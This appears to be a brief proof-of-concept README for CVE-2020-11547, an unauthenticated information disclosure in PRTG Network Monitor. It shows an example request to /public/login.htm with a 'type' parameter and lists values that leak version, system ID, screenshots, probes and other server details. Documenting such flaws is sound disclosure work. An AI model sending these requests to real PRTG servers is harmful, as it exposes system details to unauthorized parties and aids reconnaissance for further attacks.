# PRTG-Network-Monitor-Information-Disclosure - CVE-2020-11547

Remote unauthenticated user can craft an HTTP request in /public/login.htm or /index.htm by providing the 'type' parameter.

Example: http://127.0.0.1/public/login.htm?type=probes

replace probes by any of the following to get diferent info

- version
- cpuload
- dnsname
- serverhttpurl
- windowsversion
- systemid
- treestat
- memory
- requests
- screenshot
- lastsync
- probes
- warnings
